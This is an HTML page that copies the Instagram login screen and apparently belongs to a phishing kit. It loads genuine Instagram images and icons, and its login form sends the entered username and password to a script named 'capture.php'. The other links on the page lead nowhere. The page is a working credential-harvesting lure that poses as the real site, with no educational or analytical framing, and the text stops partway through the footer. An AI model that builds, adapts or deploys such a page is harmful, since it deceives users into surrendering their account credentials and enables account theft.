<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
</head>
<body>
    <div class="container">
        <div class="phone-container">
            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png" alt="Instagram App">
        </div>
        
        <div class="form-container">
            <div class="form-box">
                <div class="logo">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
                </div>
                
                <form id="login-form" action="capture.php" method="post">
                    <div class="input-box">
                        <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    </div>
                    <div class="input-box">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="login-button">Log In</button>
                </form>
                
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                
                <div class="fb-login">
                    <img src="https://www.instagram.com/static/images/homepage/fb-icon.png/c1a3a5c2f55b.png" alt="Facebook">
                    <a href="#">Log in with Facebook</a>
                </div>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-links">
                    <a href="#">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                    </a>
                    <a href="#">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
                    </a>
                </div>
            </div>
        </div>
    </div>
    
    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>

            <a href="#">Instagram Lite</a>
